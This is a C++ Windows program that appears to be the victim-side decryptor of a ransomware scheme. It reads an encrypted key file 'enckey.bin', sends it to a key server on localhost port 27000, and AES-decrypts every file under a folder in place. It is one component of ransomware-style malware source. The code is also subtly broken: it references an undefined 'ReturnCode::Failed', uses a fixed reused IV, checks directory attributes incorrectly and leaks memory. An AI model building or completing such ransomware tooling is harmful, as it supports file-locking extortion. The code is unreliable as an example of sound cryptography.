#include <iostream>
#include <vector>
#include <string>
#include <array>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <bcrypt.h>
#include <ntstatus.h>
#pragma comment (lib, "bcrypt.lib")
#pragma comment (lib, "ws2_32.lib")

// Checks the status returned from WinAPI functions. Negative status is an error.
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0) 

// return code status
enum ReturnCode { SUCCESS = 0, FAILED = 1 };

// Constants.
constexpr int KEY_LENGTH = 16;
constexpr int IV_LENGTH = 16;
constexpr int ENCRYPTED_KEY_LENGTH = 128;

ReturnCode getPathInput(std::string& path);

ReturnCode getAllFilesFromPath(std::vector<std::string>& filesList,
							   const std::string path);

ReturnCode initializeAesAlgorithm(BCRYPT_ALG_HANDLE& hAesAlg);

ReturnCode decryptFiles(const std::vector<std::string>& filesList,
					    std::array<BYTE, KEY_LENGTH>& aes128key,
					    std::array<BYTE, IV_LENGTH>& aesIV);

ReturnCode getFileData(const std::string& filePath,
                       const std::string& fileName,
					   std::array<BYTE, ENCRYPTED_KEY_LENGTH>& encryptedKey);

ReturnCode serverDecryptKey(std::array<BYTE, ENCRYPTED_KEY_LENGTH>& encryptedKey,
							std::array<BYTE, KEY_LENGTH>& decryptedKey);

int main() {

	std::string path; // input directory path. 
	std::vector<std::string> filesList; // all files in the input directory and its subdirectories.

	const std::string encryptedKeyFileName = "enckey.bin";

	std::array<BYTE, IV_LENGTH> IV = { 0x00, 0x01, 0x02, 0x03,
                                   0x04, 0x05, 0x06, 0x07,
                                   0x08, 0x09, 0x0A, 0x0B,
                                   0x0C, 0x0D, 0x0E, 0x0F };
    
	std::array<BYTE, ENCRYPTED_KEY_LENGTH> encryptedKey;
 	std::array<BYTE, KEY_LENGTH> decryptedKey;

  	if (ReturnCode::FAILED == getPathInput(path)) {
		std::cerr << "<ERROR> Input path is not a directory.\n";
		return ReturnCode::FAILED;
	}

	if (ReturnCode::FAILED == getAllFilesFromPath(filesList, path)) {
		std::cerr << "<ERROR> Cannot get files from path.\n";
		return ReturnCode::FAILED;
	}

	if (ReturnCode::FAILED == getFileData(path, encryptedKeyFileName, encryptedKey)) {
		std::cerr << "<ERROR> Failed to get \"enckey.bin\" file data.\n";
		return ReturnCode::Failed;
	}

	if (ReturnCode::FAILED == serverDecryptKey(encryptedKey, decryptedKey)) {
		std::cerr << "<ERROR> Failed to get decrypted AES symmetric key from server.\n";
		return ReturnCode::Failed;
	}

	if (ReturnCode::FAILED == decryptFiles(filesList, decryptedKey, IV)) {
		std::cerr << "<ERROR> Failed to decrypt files data.\n";
		return ReturnCode::Failed;
	}

 	return ReturnCode::SUCCESS;
}

ReturnCode getPathInput(std::string& path) {

	std::cout << "Please enter folder path >> ";
	std::cin >> path;

	if (GetFileAttributesA(path.c_str()) != FILE_ATTRIBUTE_DIRECTORY) {
		return ReturnCode::FAILED;
	}
	return ReturnCode::SUCCESS;
}

ReturnCode getAllFilesFromPath(std::vector<std::string>& filesList,
							   const std::string path) {

    std::string			currentFilePath; // the current file with its full path for storing in files list.
    std::string			newPath;
    LPCSTR				convertedRootPath; 
    LPCSTR				convertedCurrentFilePath; // represents the current file's full path.
	WIN32_FIND_DATAA	data = { 0 }; // a struct for file's data.
	HANDLE				hFind = NULL;


	newPath = path + "\\*"; // adds suffix for all files under the chosen directory.
	convertedRootPath = newPath.c_str(); // convert of the path into LPCSTR.

    hFind = FindFirstFileA(convertedRootPath, &data); // gets the first file in the given path.

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(data.cFileName, ".") != 0 &&
                strcmp(data.cFileName, "..") != 0 &&
				strcmp(data.cFileName, "enckey.bin")) { // ignore current and previous direcories + enckey.bin file

                currentFilePath = path + "\\" + data.cFileName;

                convertedCurrentFilePath = currentFilePath.c_str();

                if (GetFileAttributesA(convertedCurrentFilePath) == FILE_ATTRIBUTE_DIRECTORY) {
                    getAllFilesFromPath(filesList, currentFilePath); // call recursively to get all subdirectories files.
                }
                else {
                    filesList.push_back(currentFilePath); // add the file to the list.
                }
            }
        } while (FindNextFileA(hFind, &data)); // keep loop till no more files in the path.

        FindClose(hFind);
    }
    else { // prints error if cannot reach the directory
        std::cout << "<ERROR> Failed to get directory's data." << std::endl;
        return ReturnCode::FAILED;
    }
    return ReturnCode::SUCCESS;
}

ReturnCode initializeAesAlgorithm(BCRYPT_ALG_HANDLE& hAesAlg) {

    NTSTATUS	status = 0; // contains the status returned from WinAPI functions.

    // get the AES algorithm handler.
    if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(&hAesAlg,
                                                         BCRYPT_AES_ALGORITHM,
                                                         NULL,
                                                         0))) {
        std::cerr << "<ERROR> Failed to open algorithm provider." << std::endl;
        return ReturnCode::FAILED;
    }

    // sets the AES algorithm chaining mode to CBC.
    if (!NT_SUCCESS(status = BCryptSetProperty(hAesAlg,
                                               BCRYPT_CHAINING_MODE,
                                               (PBYTE)BCRYPT_CHAIN_MODE_CBC,
                                               sizeof(BCRYPT_CHAIN_MODE_CBC),
                                               0))) {
        std::cerr << "<ERROR> Failed to set CBC chaining mode to AES algorithm.\n";
        return ReturnCode::FAILED;
    }

    return ReturnCode::SUCCESS;
}

ReturnCode decryptFiles(const std::vector<std::string>& filesList,
						std::array<BYTE, KEY_LENGTH>& aes128Key,
						std::array<BYTE, IV_LENGTH>& aesIV) {

	BCRYPT_ALG_HANDLE   hAesAlg = NULL; // encryption algorithm handler.

	BCRYPT_KEY_HANDLE   hKey = NULL; // key handler.

	HANDLE              hFileRead = NULL, // read from file handler.
					    hFileWrite = NULL; // write to file handler.

	NTSTATUS            status = 0; // returned status from WinAPI functions.

	ReturnCode			returnCode = ReturnCode::SUCCESS;

	PBYTE               pbCipherText = NULL,
						pbPlainText = NULL,
						pbKeyObject = NULL,
						pbIV = NULL,
						pbFileBuffer = NULL;

	LPCSTR              lpFileToDecrypt = NULL;

	DWORD               cbCipherText = 0,
						cbPlainText = 0,
						cbData = 0,
						cbKeyObject = 0,
						cbBlockLen = 0,
						dwNumOfBytesWritten = 0,
						dwBytesRead = 0,
						cbFileSize = 0;

	LARGE_INTEGER       lFileSize = { 0 };


	if (initializeAesAlgorithm(hAesAlg) == ReturnCode::FAILED) {
		std::cerr << "<ERROR> Faild to initialize AES algorithm.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// get the key object length from AES algorithm into cbKeyObject.
	if (!NT_SUCCESS(status = BCryptGetProperty(hAesAlg,
											   BCRYPT_OBJECT_LENGTH,
											   (PBYTE)&cbKeyObject,
											   sizeof(DWORD),
											   &cbData,
											   0))) {
		std::cerr << "<ERROR> Faild to get key object length.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// allocates memory in the heap for the key object by cbKeyObject size.
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(),
		   						   HEAP_ZERO_MEMORY,
								   cbKeyObject);

	if (NULL == pbKeyObject) {
		std::cerr << "<ERROR> Failed to allocate memory on the heap.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// get the block length from AES algorithm into cbBlockLen.
	if (!NT_SUCCESS(status = BCryptGetProperty(hAesAlg,
			     							   BCRYPT_BLOCK_LENGTH,
											   (PBYTE)&cbBlockLen,
											   sizeof(DWORD),
										  	   &cbData,
											   0))) {
		std::cerr << "<ERROR> Failed to get block length.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// Checks if the block length is longer than the IV length.
	if (cbBlockLen > aesIV.size()) {
		std::cerr << "<ERROR> Block length is longer than IV length.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// Allocate a buffer for the IV as the size of a block.
	pbIV = (PBYTE)HeapAlloc(GetProcessHeap(),
							HEAP_ZERO_MEMORY,
							cbBlockLen);

	if (NULL == pbIV) {
		std::cerr << "<ERROR> Failed to allocate memory on the heap.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// copies the data from AesIV into pbIV.
	memcpy_s(pbIV,
			cbBlockLen,
			aesIV.data(),
			aesIV.size());

	// Generate the key from supplied input key bytes.
	if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(hAesAlg,
														&hKey,
														pbKeyObject,
														cbKeyObject,
														(PBYTE)aes128Key.data(),
														aes128Key.size(),
														0))) {
		std::cerr << "<ERROR> Faild to generate a symmetric key.\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// loop through the files list to encrypt each file with the symmetric key.
	for (auto& file : filesList) {

		lpFileToDecrypt = file.c_str();

		hFileRead = CreateFileA(lpFileToDecrypt,
								GENERIC_READ,
								0,
								NULL,
								OPEN_EXISTING,
								FILE_ATTRIBUTE_NORMAL,
								NULL);

		if (hFileRead == INVALID_HANDLE_VALUE) {
			std::cerr << "<ERROR> Failed to open file : " + file + "\n";
			continue;
		}

		cbFileSize = GetFileSizeEx(hFileRead, &lFileSize);

		if (!cbFileSize) {
			std::cerr << "<ERROR> Failed to get size of file : " << file << "\n";
			CloseHandle(hFileRead);
			continue;
		}

		pbFileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(),
										HEAP_ZERO_MEMORY,
										lFileSize.QuadPart);

		if (pbFileBuffer == NULL) {
			std::cerr << "<ERROR> Failed to allocate memory for file : " << file << "\n";
			continue;
		}

		// read the file content.
		if (!ReadFile(hFileRead,
			  		  pbFileBuffer,
					  lFileSize.QuadPart,
					  &dwBytesRead,
					  NULL)) {
			std::cerr << "<ERROR> Failed to read content of file : " << file << "\n";
			continue;
		}

		CloseHandle(hFileRead);

		cbCipherText = dwBytesRead;

		pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(),
								    	HEAP_ZERO_MEMORY,
										dwBytesRead);

		if (NULL == pbCipherText) {
			std::cerr << "<ERROR> Failed to allocate temporary memory for file : " << file << "\n";
			continue;
		}

		// copies the file data into pbCipherText.
		memcpy_s(pbCipherText,
	 			 cbCipherText,
	    		 pbFileBuffer,
	 			 dwBytesRead);

		// Do decryption twice - 1st for getting size needed, 2nd time for the actual decryption.
		// Get the output buffer size.
		if (!NT_SUCCESS(status = BCryptDecrypt(hKey,
											   pbCipherText,
											   cbCipherText,
											   NULL,
											   pbIV,
											   cbBlockLen,
											   NULL,
											   0,
											   &cbPlainText,
											   BCRYPT_BLOCK_PADDING))) {
			std::cerr << "<ERROR> Failed to get the cipher buffer size for file : " << file << "\n";
			continue;
		}

		pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(),
						     		   HEAP_ZERO_MEMORY,
									   cbPlainText);

		if (NULL == pbPlainText) {
			std::cerr << "<ERROR> Failed to allocate memory for plain text for file : " << file << "\n";
			continue;
		}

		if (!NT_SUCCESS(status = BCryptDecrypt(hKey,
											   pbCipherText,
											   cbCipherText,
											   NULL,
											   pbIV,
											   cbBlockLen,
											   pbPlainText,
											   cbPlainText,
											   &cbPlainText,
											   BCRYPT_BLOCK_PADDING))) {

			std::cerr << "<ERROR> Failed to perform decryption for file : " << file << "\n";
			continue;
		}

		hFileWrite = CreateFileA(lpFileToDecrypt,
				 				 GENERIC_WRITE,
								 0,
								 NULL,
								 CREATE_ALWAYS,
								 FILE_ATTRIBUTE_NORMAL,
								 NULL);

		if (hFileWrite == INVALID_HANDLE_VALUE) {
			std::cerr << "<ERROR> Failed to open file : " << file << "\n";
			continue;
		}

		dwNumOfBytesWritten = 0; // initialize number of bytes written.

		if (!WriteFile(hFileWrite,
					   pbPlainText,
				       cbPlainText,
				       &dwNumOfBytesWritten,
				       NULL)) {
			std::cerr << "<ERROR> Failed to write content to file : " << file << "\n";
			CloseHandle(hFileWrite);
			continue;
		}

		CloseHandle(hFileWrite);

		if (pbFileBuffer != NULL) {
			HeapFree(GetProcessHeap(), 0, pbFileBuffer);
		}
	}

Cleanup:

	if (hAesAlg) {
		BCryptCloseAlgorithmProvider(hAesAlg, 0);
	}

	if (hKey) {
		BCryptDestroyKey(hKey);
	}

	if (pbCipherText) {
		HeapFree(GetProcessHeap(), 0, pbCipherText);
	}

	if (pbPlainText) {
		HeapFree(GetProcessHeap(), 0, pbPlainText);
	}

	if (pbKeyObject) {
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	}

	if (pbIV) {
		HeapFree(GetProcessHeap(), 0, pbIV);
	}

	return returnCode;
}

ReturnCode getFileData(const std::string& filePath,
					   const std::string& fileName,
					   std::array<BYTE, ENCRYPTED_KEY_LENGTH>& encryptedKey) {

	NTSTATUS        status = 0;

	ReturnCode		returnCode = ReturnCode::SUCCESS;

	HANDLE          hFileRead = NULL;
	 
	PBYTE           pbFileBuffer = NULL;
	
	DWORD           cbFileSize = 0,
					dwBytesRead = 0;
	
	LARGE_INTEGER   lFileSize = { 0 };

	std::string     fullPath = filePath + "\\" + fileName;

	//std::cout << fullPath << "\n";

	// Read the file content 
	hFileRead = CreateFileA(fullPath.c_str(),
							GENERIC_READ,
							0,
							NULL,
							OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							NULL);

	if (hFileRead == INVALID_HANDLE_VALUE) {
		std::cerr << "<ERROR> Failed to open file : " << fullPath << "\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	cbFileSize = GetFileSizeEx(hFileRead, &lFileSize); // get the file size into lFileSize.

	if (!cbFileSize) {
		std::cerr << "<ERROR> Failed to get size of file : " << filePath << "\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	// creates a file buffer with the file size.
	pbFileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(),
									HEAP_ZERO_MEMORY,
									lFileSize.QuadPart);
	if (pbFileBuffer == NULL) {
		std::cerr << "<ERROR> Failed to allocate memory for file : " << filePath << "\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

	if (!ReadFile(hFileRead,
			  	  encryptedKey.data(),
				  ENCRYPTED_KEY_LENGTH,
				  &dwBytesRead,
				  NULL)) {
		std::cerr << "<ERROR> Failed to read content of file : " << filePath << "\n";
		returnCode = ReturnCode::FAILED;
		goto Cleanup;
	}

Cleanup:
	if (hFileRead) {
		CloseHandle(hFileRead);
	}

	// test
	/*
	std::cout << "Content:\n";
	for (DWORD i = 0; i < dwBytesRead; i++) {
		printf("%02X ", (encryptedKey)[i]);
	}

	std::cout << "\n\n";
	*/

	return returnCode;
}

ReturnCode serverDecryptKey(std::array<BYTE, ENCRYPTED_KEY_LENGTH>& encryptedKey,
							std::array<BYTE, KEY_LENGTH>& decryptedKey) {

	WSADATA		wsaData;
	SOCKET		ConnectSocket = INVALID_SOCKET;
	struct		addrinfo* result = NULL;
	struct		addrinfo hints;
	int			iResult;
	PCSTR		psServerIP = "127.0.0.1";
	PCSTR		psServerPort = "27000";

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return ReturnCode::FAILED;
	}

	SecureZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(psServerIP, 
						  psServerPort,
					      &hints,
						  &result);

	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return ReturnCode::FAILED;
	}

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(result->ai_family,
						   result->ai_socktype,
						   result->ai_protocol);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return ReturnCode::FAILED;
	}

	// Connect to server.
	iResult = connect(ConnectSocket,
					  result->ai_addr,
					  (int)result->ai_addrlen);

	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
		return ReturnCode::FAILED;
	}

	freeaddrinfo(result);

	// Send the encrypted key.
	iResult = send(ConnectSocket,
				   (const char*)encryptedKey.data(),
				   (int)encryptedKey.size(),
				   0);

	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return ReturnCode::FAILED;
	}

	// receive the decrypted key.
	iResult = recv(ConnectSocket,
				   (char*)decryptedKey.data(),
				   (int)decryptedKey.size(),
				   0);

	if (iResult == SOCKET_ERROR) {
		printf("recv failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return ReturnCode::FAILED;
	}

	// shutdown the connection since no more data will be sent
	iResult = shutdown(ConnectSocket, SD_SEND);

	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return ReturnCode::FAILED;
	}

	return ReturnCode::SUCCESS;
}
